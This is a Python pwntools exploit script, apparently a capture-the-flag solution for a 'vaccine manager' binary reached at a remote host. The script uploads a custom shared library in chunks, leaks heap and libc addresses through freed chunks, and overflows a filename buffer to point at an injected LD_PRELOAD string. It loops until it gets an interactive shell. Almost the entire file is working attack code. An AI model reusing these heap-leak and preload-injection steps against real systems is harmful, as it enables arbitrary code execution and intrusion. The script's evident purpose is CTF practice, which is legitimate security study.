from pwn import *

HOST, PORT = '15.165.98.42', 58763
DEBUG = True
#context.log_level = 'DEBUG'

def menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))

def add_vaccine(vtype, desc):
    menu(1)
    p.recvuntil('Select Vaccine Type\n')
    p.recvuntil('> ')
    p.sendline(str(vtype))

    p.recvuntil('Put Vaccine Description\n')
    p.recvuntil('> ')
    if len(desc) < 1024:
        p.sendline(desc)
    else:
        p.send(desc)

def modify_vaccine(idx1, idx2):
    menu(2)
    p.recvuntil('Change vaccine order\n')
    p.recvuntil('=========================\n')

    vaccines = []
    for i in range(16):
        p.recvuntil('. ')
        if i < 15:
            vaccines.append(p.recvuntil('\n{}'.format(i + 2), True))
        else:
            vaccines.append(p.recvuntil('\n=========================', True))

    p.recvuntil('First > ')
    p.sendline(str(idx1))
    p.recvuntil('Second > ')
    p.sendline(str(idx2))
    return vaccines

def delete_vaccine(idx):
    menu(3)
    p.recvuntil('Select vaccine index\n')
    p.recvuntil('> ')
    p.sendline(str(idx))

def save_cocktail():
    menu(4)
    p.recvuntil('Your cocktail vaccine is saved at ')
    return p.recvline().strip('\n')

def run_simulator(fn):
    menu(5)
    p.recvuntil('Put Your cocktail file\n')
    p.send(fn)

def start():
    global p
    if DEBUG:
        env = {'LD_LIBRARY_PATH': '/home/xion/Desktop/GoN/glibc/2.31'}
        p = process(['/home/xion/Desktop/GoN/glibc/2.31/ld-2.31.so', './manager'], env=env)
    else:
        p = remote(HOST, PORT)

with open('hook.so', 'rb') as f:
    hook_code = f.read()

assert(len(hook_code) <= 1023*15)

start()  # step 1 - save our .so file inside /tmp
p.recvuntil('> ')
p.sendline('save_our_so')

for i in range(align(1023, len(hook_code)) / 1023):
    cut_code = hook_code[i*1023:(i+1)*1023]
    assert('\n' not in hook_code[:0x10])  # shouldn't be overwitten by fd & bk
    lf_idx = [j for j, x in enumerate(cut_code) if x == '\n'][::-1]
    add_vaccine(1, cut_code.replace('\n', '?'))
    for li in lf_idx:
        delete_vaccine(i)
        add_vaccine(1, cut_code[:li].replace('\n', '?'))

hook_fn = save_cocktail()

log.success('.so @ ' + hook_fn)

p.close()

ctr = 1
while True:
    print("Try #{}".format(ctr))
    ctr += 1

    start()  # step 2 - LD_PRELOAD our .so
    p.recvuntil('> ')
    p.sendline('NEXTNEXT' + 'KEYKEYKE' + 'LD_PRELOAD=' + hook_fn + '\0')

    add_vaccine(1, 'no_consolidate')
    add_vaccine(1, 'leak_heap')
    add_vaccine(1, 'no_consolidate')
    add_vaccine(1, 'leak_libc')
    add_vaccine(1, 'no_consolidate')
    delete_vaccine(1)
    delete_vaccine(3)
    add_vaccine(1, '')
    add_vaccine(3, '')

    vaccines = modify_vaccine(1, 1)

    heap_leak = u64('\x00' + vaccines[1][-5:] + '\x00' * 2)
    heap_base = heap_leak - 0xe00
    log.success('heap: {:016x}'.format(heap_base))

    libc_leak = u64('\x00' + vaccines[3][-5:] + '\x00' * 2)
    libc_base = libc_leak - 0x1ebb00
    log.success('libc: {:016x}'.format(libc_base))

    save_cocktail()

    LD_PRELOAD_str = heap_base + 0x1750

    # we can just use other string in heap instead of 0x100 bruteforce, left as exercise for the readers :)
    run_simulator('A'*0x40 + p64(LD_PRELOAD_str))

    # 'ERROR: ld.so' (ld.so preload fail) or '  Cocktail' (execve crash-ret)
    if p.recv(1, timeout=1) in ['E', ' ']:
        p.close()
        continue

    p.interactive()
    break
